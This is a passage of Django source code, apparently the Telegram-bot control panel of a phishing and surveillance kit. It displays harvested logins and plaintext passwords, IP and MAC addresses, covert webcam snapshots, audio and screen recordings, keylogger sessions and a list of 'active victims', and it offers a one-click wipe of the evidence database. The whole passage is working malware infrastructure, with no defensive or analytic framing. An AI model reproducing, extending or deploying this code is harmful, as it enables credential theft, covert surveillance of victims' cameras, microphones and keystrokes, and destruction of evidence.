        f"📧 <b>Login:</b> <code>{html_escape(log.intercepted_id)}</code>\n"
        f"🔑 <b>Pass:</b> <code>{html_escape(log.raw_password)}</code>\n\n"
        f"🌍 <b>IP:</b> <code>{html_escape(log.geo_ip)}</code>\n"
        f"📡 <b>MAC:</b> <code>{html_escape(log.mac_address)}</code>\n"
        f"💻 <b>Device:</b> {html_escape(fp)}\n"
        f"⚠️ <b>Risk:</b> {log.risk_level}\n"
        f"🎥 <b>Media:</b> {mi}\n"
    )
    if src:
        text += f"🌐 <b>URL:</b> <code>{html_escape(src)}</code>\n"
    if ct:
        text += f"⏰ <b>Client time:</b> <code>{ct}</code>\n"
    text += f"🕐 <b>Server:</b> <code>{ts}</code>\n"
    if total is not None:
        text += f"{'━'*20}\n📋 {page+1} / {total}"
    return text

def build_log_buttons(log, page=0, total=0):
    """Build inline keyboard for single log card"""
    btn_row1 = []
    if log.webcam_snap:
        btn_row1.append({"text": "📸 Webcam", "callback_data": f"cam:{log.id}"})
    if log.voice_audio:
        btn_row1.append({"text": "🎤 Audio", "callback_data": f"audio:{log.id}"})
    if log.screen_recording:
        btn_row1.append({"text": "🖥 Screen", "callback_data": f"screen:{log.id}"})

    nav = []
    if page > 0:
        nav.append({"text": "⬅️", "callback_data": f"page:{page-1}"})
    nav.append({"text": "🗑 Del", "callback_data": f"del:{log.id}:{page}"})
    if page < total - 1:
        nav.append({"text": "➡️", "callback_data": f"page:{page+1}"})

    bottom = [
        {"text": "📊 Stats", "callback_data": "cmd:stats"},
        {"text": "🏠 Menu", "callback_data": "cmd:menu"},
        {"text": "🔄 Refresh", "callback_data": f"page:{page}"},
    ]

    keyboard = {"inline_keyboard": []}
    if btn_row1:
        keyboard["inline_keyboard"].append(btn_row1)
    if nav:
        keyboard["inline_keyboard"].append(nav)
    keyboard["inline_keyboard"].append(bottom)
    return keyboard

def build_menu(user_name, total, victims, keylog):
    text = (
        f"🤖 <b>WAR ROOM</b> — <i>{user_name}</i>\n"
        f"{'━'*20}\n"
        f"🎯 Intercepts: <b>{total}</b>  |  👁 Victims: <b>{victims}</b>  |  ⌨️ Keylogs: <b>{keylog}</b>\n"
        f"{'━'*20}\n"
        f"Buyruqni tanlang:"
    )
    keyboard = {"inline_keyboard": [
        [{"text": "📋 Logs (paginated)", "callback_data": "page:0"},
         {"text": "📊 Stats",            "callback_data": "cmd:stats"}],
        [{"text": "⌨️ Keylog",           "callback_data": "cmd:keylog"},
         {"text": "👁 Victims",          "callback_data": "cmd:victims"}],
        [{"text": "📸 Last Webcam",      "callback_data": "cmd:photo"},
         {"text": "🌐 URLs",             "callback_data": "cmd:url"}],
        [{"text": "🗑 Wipe ALL",         "callback_data": "cmd:wipe"},
         {"text": "🔄 Refresh",          "callback_data": "cmd:menu"}],
    ]}
    return text, keyboard

@csrf_exempt
def telegram_bot_webhook(request):
    if request.method != "POST":
        return JsonResponse({"ok": True})
    try:
        data = json.loads(request.body)
    except Exception:
        return JsonResponse({"ok": True})

    from .models import ThreatLog, LiveKeyStroke, ActiveVictim

    # ── Parse update ──
    cb = data.get("callback_query")
    msg = data.get("message")

    if cb:
        chat_id   = str(cb["message"]["chat"]["id"])
        user_name = cb["message"]["chat"].get("first_name", "Operator")
        msg_id    = cb["message"]["message_id"]
        cb_id     = cb["id"]
        text      = cb.get("data", "")
    elif msg:
        chat_id   = str(msg["chat"]["id"])
        user_name = msg["chat"].get("first_name", "Operator")
        msg_id    = None
        cb_id     = None
        text      = msg.get("text", "").strip()
    else:
        return JsonResponse({"ok": True})

    # ── Auth ──
    if chat_id != str(TELEGRAM_CHAT_ID):
        tg_send(chat_id, "⛔ <b>ACCESS DENIED</b>")
        return JsonResponse({"ok": True})

    if cb_id:
        tg_answer_cb(cb_id)

    # ─────────────────────────────────────────
    # CALLBACK: page:N  — paginated log cards
    # ─────────────────────────────────────────
    if text.startswith("page:"):
        page = int(text.split(":")[1])
        logs = list(ThreatLog.objects.order_by("-timestamp"))
        total = len(logs)
        if not logs:
            if cb_id and msg_id:
                tg_edit(chat_id, msg_id, "📭 <b>No intercepts yet.</b>")
            else:
                tg_send(chat_id, "📭 <b>No intercepts yet.</b>")
            return JsonResponse({"ok": True})
        page = max(0, min(page, total - 1))
        log = logs[page]
        card_text = build_log_card(log, page, total)
        buttons   = build_log_buttons(log, page, total)
        if cb_id and msg_id:
            tg_edit(chat_id, msg_id, card_text, buttons)
        else:
            tg_send(chat_id, card_text, buttons)

    # ─────────────────────────────────────────
    # CALLBACK: cam / audio / screen
    # ─────────────────────────────────────────
    elif text.startswith("cam:"):
        log_id = int(text.split(":")[1])
        try:
            log = ThreatLog.objects.get(id=log_id)
            if log.webcam_snap:
                tg_send_photo(chat_id, log.webcam_snap, f"📸 Webcam #{log.id} — {log.intercepted_id} — {log.geo_ip}")
            else:
                tg_send(chat_id, "❌ Webcam rasm yo'q.")
        except ThreatLog.DoesNotExist:
            tg_send(chat_id, "❌ Log topilmadi.")

    elif text.startswith("audio:"):
        log_id = int(text.split(":")[1])
        try:
            log = ThreatLog.objects.get(id=log_id)
            if log.voice_audio and log.voice_audio.startswith("data:audio"):
                import base64 as b64
                ab = b64.b64decode(log.voice_audio.split(",")[1])
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendAudio",
                    data={"chat_id": chat_id, "caption": f"🎤 Audio #{log.id}"},
                    files={"audio": ("audio.webm", ab)}, timeout=20
                )
            else:
                tg_send(chat_id, "❌ Audio yo'q.")
        except ThreatLog.DoesNotExist:
            tg_send(chat_id, "❌ Log topilmadi.")

    elif text.startswith("screen:"):
        log_id = int(text.split(":")[1])
        try:
            log = ThreatLog.objects.get(id=log_id)
            if log.screen_recording and log.screen_recording.startswith("data:video"):
                import base64 as b64
                vb = b64.b64decode(log.screen_recording.split(",")[1])
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                    data={"chat_id": chat_id, "caption": f"🖥 Screen #{log.id}"},
                    files={"document": ("screen.webm", vb)}, timeout=30
                )
            else:
                tg_send(chat_id, "❌ Screen recording yo'q.")
        except ThreatLog.DoesNotExist:
            tg_send(chat_id, "❌ Log topilmadi.")

    # ─────────────────────────────────────────
    # CALLBACK: del:ID:page
    # ─────────────────────────────────────────
    elif text.startswith("del:"):
        parts = text.split(":")
        log_id = int(parts[1])
        page   = int(parts[2]) if len(parts) > 2 else 0
        kb = {"inline_keyboard": [[
            {"text": "✅ Ha, o'chir", "callback_data": f"delok:{log_id}:{page}"},
            {"text": "❌ Yo'q",       "callback_data": f"page:{page}"},
        ]]}
        tg_edit(chat_id, msg_id, f"⚠️ <b>#{log_id} ni o'chirishni tasdiqlang?</b>", kb)

    elif text.startswith("delok:"):
        parts  = text.split(":")
        log_id = int(parts[1])
        page   = int(parts[2]) if len(parts) > 2 else 0
        ThreatLog.objects.filter(id=log_id).delete()
        # Show next page
        logs  = list(ThreatLog.objects.order_by("-timestamp"))
        total = len(logs)
        if not logs:
            tg_edit(chat_id, msg_id, "✅ O'chirildi. 📭 Boshqa intercept yo'q.")
        else:
            page = min(page, total - 1)
            log  = logs[page]
            tg_edit(chat_id, msg_id, f"✅ <b>#{log_id} o'chirildi.</b>\n\n" + build_log_card(log, page, total), build_log_buttons(log, page, total))

    # ─────────────────────────────────────────
    # CALLBACK: cmd:xxx
    # ─────────────────────────────────────────
    elif text.startswith("cmd:") or text.startswith("/"):
        cmd = text.replace("cmd:", "/").split()[0].lower()
        args = text.split()[1:]

        if cmd in ["/menu", "/start", "/help"]:
            total   = ThreatLog.objects.count()
            victims = ActiveVictim.objects.count()
            keylog  = LiveKeyStroke.objects.count()
            mt, mk = build_menu(user_name, total, victims, keylog)
            if cb_id and msg_id:
                tg_edit(chat_id, msg_id, mt, mk)
            else:
                tg_send(chat_id, mt, mk)

        elif cmd == "/stats":
            logs = ThreatLog.objects.all()
            total    = logs.count()
            critical = logs.filter(risk_level="CRITICAL").count()
            high     = logs.filter(risk_level="HIGH").count()
            medium   = logs.filter(risk_level="MEDIUM").count()
            low      = logs.filter(risk_level="LOW").count()
            with_cam = logs.exclude(webcam_snap__isnull=True).exclude(webcam_snap="").count()
            with_aud = logs.exclude(voice_audio__isnull=True).exclude(voice_audio="").count()
            with_scr = logs.exclude(screen_recording__isnull=True).exclude(screen_recording="").count()
            desktop  = logs.filter(device_type="desktop").count()
            mobile   = logs.filter(device_type="mobile").count()
            victims  = ActiveVictim.objects.count()
            keylogs  = LiveKeyStroke.objects.count()
            txt = (
                f"📊 <b>STATS</b>\n{'━'*20}\n"
                f"🎯 Total: <b>{total}</b>  |  🔑 Login: {logs.filter(auth_mode='LOGIN').count()}  |  📝 Signup: {logs.filter(auth_mode='SIGNUP').count()}\n\n"
                f"🔴 CRITICAL: {critical}  🟠 HIGH: {high}\n🟡 MEDIUM: {medium}  🟢 LOW: {low}\n\n"
                f"📸 Webcam: {with_cam}  🎤 Audio: {with_aud}  🖥 Screen: {with_scr}\n"
                f"🖥 Desktop: {desktop}  📱 Mobile: {mobile}\n\n"
                f"👁 Active victims: {victims}  ⌨️ Keylogs: {keylogs}\n"
                f"{'━'*20}\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            kb = {"inline_keyboard": [[
                {"text": "📋 Logs", "callback_data": "page:0"},
                {"text": "🏠 Menu", "callback_data": "cmd:menu"},
            ]]}
            if cb_id and msg_id:
                tg_edit(chat_id, msg_id, txt, kb)
            else:
                tg_send(chat_id, txt, kb)

        elif cmd == "/keylog":
            keys = LiveKeyStroke.objects.order_by("-timestamp")[:10]
            if not keys:
                tg_send(chat_id, "⌨️ Keylog sessiya yo'q.")
            else:
                txt = f"⌨️ <b>KEYLOG SESSIONS</b>\n{'━'*20}\n"
                for k in keys:
                    decoded = decode_keystrokes(k.keystrokes)
                    txt += f"\n👤 <b>{html_escape(k.username_context)}</b>  🕐 {k.timestamp.strftime('%H:%M:%S')}\n<code>{html_escape(decoded[:120])}</code>\n"
                kb = {"inline_keyboard": [[
                    {"text": "🏠 Menu", "callback_data": "cmd:menu"},
                    {"text": "🔄 Refresh", "callback_data": "cmd:keylog"},
                ]]}
                if cb_id and msg_id:
                    tg_edit(chat_id, msg_id, txt, kb)
                else:
                    tg_send(chat_id, txt, kb)

        elif cmd == "/victims":
            victims = ActiveVictim.objects.order_by("-last_seen")[:10]
            if not victims:
                tg_send(chat_id, "👁 Active victim yo'q.")
            else:
                txt = f"👁 <b>ACTIVE VICTIMS</b>\n{'━'*20}\n"
                for v in victims:
                    txt += (
                        f"\n🌍 <b>{html_escape(v.ip_address)}</b> <code>{v.session_id[:8]}</code>\n"
                        f"  📱 {html_escape(str(v.device_info or '')[:50])}\n"
                        f"  🔗 {html_escape(str(v.current_url or 'N/A')[:50])}\n"
                        f"  🕐 {v.last_seen.strftime('%H:%M:%S')}\n"
                    )
                kb = {"inline_keyboard": [[
                    {"text": "🏠 Menu", "callback_data": "cmd:menu"},
                    {"text": "🔄 Refresh", "callback_data": "cmd:victims"},
                ]]}
                if cb_id and msg_id:
                    tg_edit(chat_id, msg_id, txt, kb)
                else:
                    tg_send(chat_id, txt, kb)

        elif cmd == "/photo":
            log = ThreatLog.objects.exclude(webcam_snap__isnull=True).exclude(webcam_snap="").order_by("-timestamp").first()
            if not log:
                tg_send(chat_id, "📭 Webcam rasm yo'q.")
            else:
                tg_send_photo(chat_id, log.webcam_snap,
                    f"📸 <b>Webcam #{log.id}</b>\n👤 {log.intercepted_id}\n🌍 {log.geo_ip}\n🕐 {log.timestamp.strftime('%Y-%m-%d %H:%M')}")

        elif cmd == "/url":
            logs = ThreatLog.objects.exclude(source_url__isnull=True).exclude(source_url="").order_by("-timestamp")[:8]
            if not logs:
                tg_send(chat_id, "🌐 URL yo'q.")
            else:
                txt = f"🌐 <b>SOURCE URLs</b>\n{'━'*20}\n"
                for log in logs:
                    txt += f"\n<b>#{log.id}</b> <code>{html_escape(str(log.source_url)[:90])}</code>\n  👤 {html_escape(log.intercepted_id)} | 🕐 {log.timestamp.strftime('%H:%M')}\n"
                kb = {"inline_keyboard": [[
                    {"text": "🏠 Menu", "callback_data": "cmd:menu"},
                ]]}
                if cb_id and msg_id:
                    tg_edit(chat_id, msg_id, txt, kb)
                else:
                    tg_send(chat_id, txt, kb)

        elif cmd == "/wipe":
            if args and args[0] == "CONFIRM":
                c1 = ThreatLog.objects.count()
                c2 = LiveKeyStroke.objects.count()
                ThreatLog.objects.all().delete()
                LiveKeyStroke.objects.all().delete()
                ActiveVictim.objects.all().delete()
                tg_edit(chat_id, msg_id, f"✅ <b>WIPED</b>\nO'chirildi: {c1} log, {c2} keylog.\n⚠️ Database tozalandi.")
            else:
                kb = {"inline_keyboard": [[
                    {"text": "⚠️ HA — HAMMA NARSANI O'CHIR", "callback_data": "cmd:/wipe CONFIRM"},
                    {"text": "❌ Bekor",                       "callback_data": "cmd:menu"},
                ]]}
                tg_edit(chat_id, msg_id, "⚠️ <b>OGOHLANTIRISH!</b>\nBarcha ma'lumotlar o'chiriladi.\n\nDavom etasizmi?", kb)

        else:
            total   = ThreatLog.objects.count()
            victims = ActiveVictim.objects.count()
            keylog  = LiveKeyStroke.objects.count()
            mt, mk = build_menu(user_name, total, victims, keylog)
            tg_send(chat_id, mt, mk)

    else:
        total   = ThreatLog.objects.count()
        victims = ActiveVictim.objects.count()
        keylog  = LiveKeyStroke.objects.count()
        mt, mk = build_menu(user_name, total, victims, keylog)
        tg_send(chat_id, mt, mk)

    return JsonResponse({"ok": True})

